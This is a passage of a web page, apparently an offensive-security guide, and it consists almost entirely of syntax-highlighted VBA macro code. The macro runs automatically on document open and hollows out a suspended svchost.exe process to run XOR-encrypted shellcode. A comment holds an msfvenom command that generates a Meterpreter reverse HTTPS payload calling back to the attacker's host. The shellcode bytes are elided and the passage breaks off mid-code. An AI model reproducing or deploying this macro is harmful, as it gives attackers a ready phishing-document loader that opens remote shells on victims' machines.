style="color:#393A34"><span class="token plain">    hStdError As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Type</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Private Type PROCESS_INFORMATION</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hProcess As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hThread As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    dwProcessId As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    dwThreadId As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Type</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Document_Open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hollow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AutoOpen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hollow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&#x27; Performs process hollowing to </span><span class="token class-name">run</span><span class="token plain"> shellcode </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> svchost</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Function</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">hollow</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim si As STARTUPINFOA</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">RtlZeroMemory</span><span class="token plain"> si</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">si</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    si</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">cb </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">si</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    si</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dwFlags </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">H100</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim pi As PROCESS_INFORMATION</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim procOutput As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; Start svchost</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> a suspended </span><span class="token class-name">state</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    procOutput </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateProcessA</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">vbNullString</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;C:\\Windows\\System32\\svchost.exe&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal </span><span class="token number" style="color:#36acaa">0</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal </span><span class="token number" style="color:#36acaa">0</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> False</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">H4</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> vbNullString</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> si</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> pi</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim ProcBasicInfo As PROCESS_BASIC_INFORMATION</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim ProcInfo As </span><span class="token class-name">LongPtr</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ProcInfo </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> pi</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">hProcess</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim PEBinfo As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token preprocessor property" style="color:#36acaa">#If Win64 Then</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    zwOutput </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ZwQueryInformationProcess</span><span class="token class-name punctuation" style="color:#393A34">(</span><span class="token class-name">ProcInfo</span><span class="token class-name punctuation" style="color:#393A34">,</span><span class="token class-name"> 0</span><span class="token class-name punctuation" style="color:#393A34">,</span><span class="token class-name"> ProcBasicInfo</span><span class="token class-name punctuation" style="color:#393A34">,</span><span class="token class-name"> 48</span><span class="token class-name punctuation" style="color:#393A34">,</span><span class="token class-name"> 0</span><span class="token class-name punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PEBinfo </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ProcBasicInfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">PebAddress </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token return-type class-name">Dim</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AddrBuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">7</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Byte</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token preprocessor property" style="color:#36acaa">#Else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    zwOutput </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ZwQueryInformationProcess</span><span class="token class-name punctuation" style="color:#393A34">(</span><span class="token class-name">ProcInfo</span><span class="token class-name punctuation" style="color:#393A34">,</span><span class="token class-name"> 0</span><span class="token class-name punctuation" style="color:#393A34">,</span><span class="token class-name"> ProcBasicInfo</span><span class="token class-name punctuation" style="color:#393A34">,</span><span class="token class-name"> 24</span><span class="token class-name punctuation" style="color:#393A34">,</span><span class="token class-name"> 0</span><span class="token class-name punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PEBinfo </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ProcBasicInfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">PebAddress </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token return-type class-name">Dim</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AddrBuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Byte</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token preprocessor property" style="color:#36acaa">#End if</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim tmp As </span><span class="token class-name">Long</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    tmp </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token preprocessor property" style="color:#36acaa">#If Win64 Then</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; Read </span><span class="token number" style="color:#36acaa">8</span><span class="token plain"> bytes of PEB to obtain </span><span class="token keyword" style="color:#00009f">base</span><span class="token plain"> address </span><span class="token class-name">of</span><span class="token plain"> svchost </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token class-name">AddrBuf</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    readOutput </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ReadProcessMemory</span><span class="token class-name punctuation" style="color:#393A34">(</span><span class="token class-name">ProcInfo</span><span class="token class-name punctuation" style="color:#393A34">,</span><span class="token class-name"> PEBinfo</span><span class="token class-name punctuation" style="color:#393A34">,</span><span class="token class-name"> AddrBuf</span><span class="token class-name punctuation" style="color:#393A34">(</span><span class="token class-name">0</span><span class="token class-name punctuation" style="color:#393A34">)</span><span class="token class-name punctuation" style="color:#393A34">,</span><span class="token class-name"> 8</span><span class="token class-name punctuation" style="color:#393A34">,</span><span class="token class-name"> tmp</span><span class="token class-name punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    svcHostBase </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AddrBuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">7</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">56</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    svcHostBase </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> svcHostBase </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AddrBuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">48</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    svcHostBase </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> svcHostBase </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AddrBuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    svcHostBase </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> svcHostBase </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AddrBuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    svcHostBase </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> svcHostBase </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AddrBuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">24</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    svcHostBase </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> svcHostBase </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AddrBuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    svcHostBase </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> svcHostBase </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AddrBuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    svcHostBase </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> svcHostBase </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AddrBuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token preprocessor property" style="color:#36acaa">#Else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; Read </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"> bytes of PEB to obtain </span><span class="token keyword" style="color:#00009f">base</span><span class="token plain"> address </span><span class="token class-name">of</span><span class="token plain"> svchost </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token class-name">AddrBuf</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    readOutput </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ReadProcessMemory</span><span class="token class-name punctuation" style="color:#393A34">(</span><span class="token class-name">ProcInfo</span><span class="token class-name punctuation" style="color:#393A34">,</span><span class="token class-name"> PEBinfo</span><span class="token class-name punctuation" style="color:#393A34">,</span><span class="token class-name"> AddrBuf</span><span class="token class-name punctuation" style="color:#393A34">(</span><span class="token class-name">0</span><span class="token class-name punctuation" style="color:#393A34">)</span><span class="token class-name punctuation" style="color:#393A34">,</span><span class="token class-name"> 4</span><span class="token class-name punctuation" style="color:#393A34">,</span><span class="token class-name"> tmp</span><span class="token class-name punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    svcHostBase </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AddrBuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">24</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    svcHostBase </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> svcHostBase </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AddrBuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    svcHostBase </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> svcHostBase </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AddrBuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    svcHostBase </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> svcHostBase </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AddrBuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token preprocessor property" style="color:#36acaa">#End if</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token return-type class-name">Dim</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">data</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">512</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Byte</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; Read more data </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> PEB so e_lfanew offset can be </span><span class="token class-name">retrieved</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    readOutput2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ReadProcessMemory</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ProcInfo</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> svcHostBase</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">data</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">512</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> tmp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; Read e_lfanew offset </span><span class="token keyword" style="color:#00009f">value</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">and</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">add</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim e_lfanew_offset As </span><span class="token class-name">Long</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    e_lfanew_offset </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">data</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">60</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim opthdr As </span><span class="token class-name">Long</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    opthdr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e_lfanew_offset </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; Construct relative </span><span class="token keyword" style="color:#00009f">virtual</span><span class="token plain"> address </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> svchost&#x27;s entry point</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim entrypoint_rva As </span><span class="token class-name">Long</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    entrypoint_rva </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">data</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">opthdr </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">24</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    entrypoint_rva </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> entrypoint_rva </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">data</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">opthdr </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    entrypoint_rva </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> entrypoint_rva </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">data</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">opthdr </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    entrypoint_rva </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> entrypoint_rva </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">data</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">opthdr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim addressOfEntryPoint As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; Add </span><span class="token keyword" style="color:#00009f">base</span><span class="token plain"> address of svchost with the entry point RVA to </span><span class="token keyword" style="color:#00009f">get</span><span class="token plain"> the start of the buffer to overwrite with </span><span class="token class-name">shellcode</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    addressOfEntryPoint </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> entrypoint_rva </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> svcHostBase</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; Buffer </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> malicious crypted shellcode needs to go here</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim sc As Variant</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim key As String</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; TODO change the </span><span class="token class-name">key</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    key </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;CHANGEMYKEY&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&#x27; msfvenom </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">p windows</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">meterpreter</span><span class="token operator" style="color:#393A34">/</span><span class="token class-name">reverse_https</span><span class="token plain"> LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token class-name">tun0</span><span class="token plain"> LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">443</span><span class="token plain"> EXITFUNC</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">thread </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">f vbapplication </span><span class="token operator" style="color:#393A34">--</span><span class="token plain">encrypt xor </span><span class="token operator" style="color:#393A34">--</span><span class="token plain">encrypt</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">key &#x27;CHANGEMYKEY&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Array</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">145</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">145</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">252</span><span class="token punctuation" style="color:#393A34">,</span><span class="token range operator" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">180</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim scSize As </span><span class="token class-name">Long</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    scSize </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">UBound</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sc</span><span class="token punctuation" 